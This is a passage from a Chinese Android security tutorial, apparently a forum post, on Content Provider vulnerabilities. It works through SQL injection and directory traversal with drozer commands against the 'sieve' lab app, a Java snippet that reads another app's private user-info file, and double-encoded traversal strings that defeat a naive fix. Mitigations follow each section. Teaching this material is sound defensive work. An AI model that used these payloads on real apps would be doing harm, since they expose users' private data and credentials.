
```java
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "'"
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection " \* from Key;--+"
```

![image-20210922112523603](upload/attach/202109/905443\_UEA2PVNM7SMW6M8.png)

列出所有表信息：

```java
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "\* FROM SQLITE\_MASTER WHERE type='table';--"
```

![image-20210922112523603](upload/attach/202109/905443\_ATVKAEG5HQM3GT5.png)

获取具体表信息：

```java
run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "\* FROM Key;--"
```

![image-20210922112523603](upload/attach/202109/905443\_KWQW5V7SXP52NGH.png)

列出该 App 的表信息：

```java
run scanner.provider.sqltables -a com.mwr.example.sieve
```

![image-20210922112523603](upload/attach/202109/905443\_PMANUDQ547U2CN6.png)

### 案例 3：CVE-2018-9493：Download Provider SQL 注入

漏洞分析：

```java
Download Provider 中的以下 columns 不允许被外部访问，例如 CookieData，但是利用 SQL 注入漏洞可以绕过这个限制。
projection 参数存在注入漏洞，结合二分法可以爆出某些 columns 字段的内容。
```

目标代码：

![image-20210922131649440](upload/attach/202109/905443\_VHTPUNDMAJDMFYM.png)

攻击代码：

详细可以参考该作者博客：(<mark class="encrypted">d76K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6E0j5h3u0A6L8U0l9H3y4q4)9J5k6h3N6A6N6r3S2#2j5W2)9J5k6h3W2G2i4K6u0r3x3U0l9I4z5g2)9J5c8U0l9@1i4K6u0r3x3e0g2Q4x3V1k6m8L8X3c8J5L8$3W2V1i4K6u0V1c8r3!0%4L8X3I4G2j5h3c8Q4x3X3c8b7M7X3!0$3K9h3c8W2M7W2)9J5y4f1f1$3i4K6t1#2b7V1y4Q4x3U0f1^5c8W2)9J5y4f1f1$3i4K6t1#2b7U0c8Q4x3U0f1&6c8g2)9J5y4f1f1#2i4K6t1#2z5o6S2Q4x3U0f1^5y4W2)9J5y4f1f1$3i4K6t1#2z5f1g2Q4x3U0f1&6x3q4)9J5c8W2)9J5z5b7`.`.</mark>

#### （3）安全防护

```java
1. 实现健壮的服务端校验
2. 使用参数化查询语句，比如 SQLiteStatement
3. 避免使用 rawQuery()
4. 过滤用户的输入
```

### 4. 目录遍历漏洞

#### （1）原理介绍

```java
Android Content Provider 存在文件目录遍历安全漏洞。该漏洞源于对外暴露 Content Provider 组件的应用，没有对 Content Provider 组件的访问进行权限控制，也没有对访问目标文件的 Content Query Uri 进行有效判断。攻击者利用该应用暴露的 Content Provider 的 openFile() 接口进行文件目录遍历，以达到访问任意可读文件的目的。
```

漏洞触发的前提条件：

```java
对外暴露的 Content Provider 组件实现了 openFile() 接口。
没有对所访问的目标文件 Uri 进行有效判断，例如没有过滤限制 "../"，可实现任意可读文件的访问。
```

#### （2）漏洞复现

##### 案例 1：赶集网 Android 客户端 Content Provider 组件任意文件读取漏洞

漏洞分析：

```java
赶集网客户端 APP 的实现中定义了一个可以访问本地文件的 Content Provider 组件，默认的 android:exported="true"，对应 com.ganji.android.jobs.html5.LocalFileContentProvider。该 Provider 实现了 openFile() 接口，通过此接口可以访问内部存储 app\_webview 目录下的数据。由于后台未能对目标文件地址进行有效判断，可以通过 "../" 实现目录跨越，实现对任意私有数据的访问。当然，也可以访问任意外部存储数据，只是我们更关心私有敏感数据。
```

攻击代码：

```java
public void GJContentProviderFileOperations(){
    try{
        InputStream in = getContentResolver().openInputStream(Uri.parse("content://com.ganji.html5.localfile.1/webview/../../shared\_prefs/userinfo.xml"));
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buffer = new byte[1024];
        int n = in.read(buffer);
        while(n>0){
            out.write(buffer, 0, n);
            n = in.read(buffer);
            Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH\_LONG).show();
        }
    }catch(Exception e){
        debugInfo(e.getMessage());
    }
}
```

##### 案例 2：样本 `sieve`

我们检测文件遍历漏洞：

```java
run scanner.provider.traversal -a <包名>
```

![image-20210922131649440](upload/attach/202109/905443\_9B5T695345FCUZF.png)

我们读取系统文件：

```java
run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
```

![image-20210922131649440](upload/attach/202109/905443\_PJ4KCCTEB3UEZGM.png)

我们下载系统文件：

```java
run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db f:/home/database.db
```

![image-20210922131649440](upload/attach/202109/905443\_M3GEQE8EG4QKYFC.png)

##### 案例 3

目标代码：

```java
private static String IMAGE\_DIRECTORY=localFile.getAbsolutePath();

public ParcelFileDescriptor openFile(Uri paramUri,String paramString)
throws FileNotFoundException{
    File file=new File(IMAGE\_DIRECTORY,paramUri.getLastPathSegment());
    return ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE\_READ\_ONLY);
}
```

我们可以从目标代码中分析，这段代码使用 `android.net.Uri.getLastPathSegment()` 从 `paramUri` 中获取文件名，然后将其放置在预定义好的目录 `IMAGE\_DIRECTORY` 中。如果该 URL 是 encoded 编码后的，那么将可能导致目录遍历漏洞。

Android 4.3 开始，`Uri.getLastPathSegment()` 内部实现调用 `Uri.getPathSegments()`：

`Uri.getPathSegments()` 部分代码片段：

```java
PathSegments getPathSegments(){
    if(pathSegments!=null){
        return pathSegments;
    }
    String path = getEncoded();
    if(path==null){
        return pathSegments = PathSegments.EMPTY;
    }
    PathSegmentsBuilder segmentBuilder=new PathSegmentsBuilder();
    int previous =0;
    int current;
    while((current=path.indexOf('/',previous))>-1){
        if(previous<current){
            String decodedSegment=decode(path.substring(previous,current));
            segmentBuilder.add(decodedSegment);
        }
        previous=current+1;
    }
    if(previous<path.length()){
        segmentBuilder.add(decode(path.substring(preyious)));
    }
    return pathSegments=segmentBuilder.build();
}
```

`Uri.getPathSegments()` 首先会通过 `getEncoded()` 获取一个路径，然后以 `/` 为分隔符将 `path` 分成片段，最后调用 `decode()` 方法解码。

假如我们传递 encoded 编码后的 URL 给 `getLastPathSegment()`，编码后的分隔符就变成了 `%2F`，绕过了内部的分割规则，那么返回的就可能不是真正想要的文件了。这是 API 设计方面的问题，直接导致了目录遍历漏洞。

```java
public String getLastPathSegment(){
    List<String> segments=getPathSegments();
    int size=segments.size();
    if(size==0){
        return null;
    }
    return segments.get(size-1);
}
```

为了避免这种情况导致的目录遍历漏洞，开发者应该在传递给 `getLastPathSegment()` 之前解码，采用调用两次 `getLastPathSegment()` 方法的方式。第一次调用是为了解码，第二次调用期望得到正确的值。这一部分大家可以详细参考博客：(<mark class="encrypted">3d2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1k6h3p5&6i4K6u0W2P5s2W2\*7i4K6u0r3M7r3!0K6N6q4)9J5c8U0M7#2z5o6b7K6x3o6b7%4y4W2)9J5k6h3S2@1L8h3I4Q4x3U0V1`.</mark>

```java
private static String IMAGE\_DIRECTORY=localFile.getAbsolutePath();

public ParcelFileDescriptor openFile(Uri paramUri,String paramString) throws FileNotFoundException{
    File file=new File(IMAGE\_DIRECTORY,Uri.parse(paramUri.getLastPathSegment()).getLastPathSegment());
    return ParcelFileDescriptor.open(file,ParcelFileDescriptor.MODE\_READ\_ONLY);
}
```

这个编码后的 URL：

```text
..%2F..%2F..%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared\_prefs%2FExample.xml
```

第一次调用 `getLastPathSegment()`，会返回：

```text
../../../data/data/com.example.android.app/shared\_prefs/Example.xml
```

第二次调用 `getLastPathSegment()` 会返回 `Example.xml`。

然而攻击者可以采用一种叫做 “Double Encoding” 的技术，使得第一次调用 `getLastPathSegment()` 后无法解码。

比如下面经过 double encoded 后的字符串就可以绕过上面这种防御：

```text
%252E%252E%252F%252E%252E%252F%252E%252E%252Fdata%252Fdata%252Fcom.example.android.app%252Fshared\_prefs%252FExample.xml
```

第一次解码后：

```text
%2E%2E%2F%2E%2E%2F%2E%2E%2Fdata%2Fdata%2Fcom.example.android.app%2Fshared\_prefs%2FExample.xml
```

第二次解码后：

```text
../../../data/data/com.example.android.app/shared\_prefs/Example.xml
```

仍会导致目录遍历。所以简单地解码后再传入也是不够的，仍然需要严格校验，以确保 `path` 是期望的路径。

#### （3）安全防护

```java
1. 将不必要导出的 Content Provider 设置为不导出
2. 去除没有必要的 openFile() 接口
3. 过滤限制跨域访问，对访问目标文件的路径进行有效判断
4. 设置权限来进行内部应用通过 Content Provider 的数据共享
```

## 四、实验总结

本文对 Content Provider 内容提供器的基本原理做了一个详细讲解，然后对 Provider 常见的一些漏洞情况作了分析。这里面一部分漏洞来自漏洞平台，一部分来自网上的博客收集总结。还提供了一个样例 `sieve.apk`，初步实现信息泄露、SQL 注入、目录遍历漏洞的基本操作方式，也介绍了一般挖掘 Provider 漏洞的基本方法。

其中关于 drozer 的具体操作使用，大家可以参考之前的博客：[Android 漏洞挖掘三板斧——drozer+Inspeckage(Xposed)+MobSF](https://bbs.pediy.com/thread-269196.htm)。当然，可能对于 Provider 中的漏洞介绍还不是很全面，其他的就请各位大佬指正了。

GitHub 首页：<a href="elink@007K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6i4K9h3&6V1h3r3q4S2i4K6u0r3b7h3&6V1M7X3!0A6k6q4)9J5k6q4k6#2L8r3&6W2M7X3q4T1K9h3I4A6N6s2W2Q4x3X3c8y4K9h3&6A6L8X3M7`.">github</a>

## 五、参考文献

Content Provider 原理介绍
